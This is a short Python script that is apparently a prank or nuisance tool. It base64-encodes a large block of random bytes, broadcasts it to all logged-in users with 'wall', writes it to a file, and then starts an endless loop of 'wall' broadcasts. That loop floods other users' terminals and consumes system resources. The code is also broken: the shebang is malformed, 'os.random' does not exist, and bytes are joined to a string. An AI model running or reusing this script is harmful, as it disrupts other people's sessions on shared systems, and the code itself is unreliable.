#/usr/bin/python3
#PS : it may dangerously corrupt your memory, its nothing but might take a lot of process space
#Check the sophisticated one
import os
import base64

result=os.random(50000000)
result=base64.b64encode(result)
os.system("wall -n "+result)

with open("zazap","wb") as f:
    f.write(result)

os.system("while :; do wall -n zazap; done;")
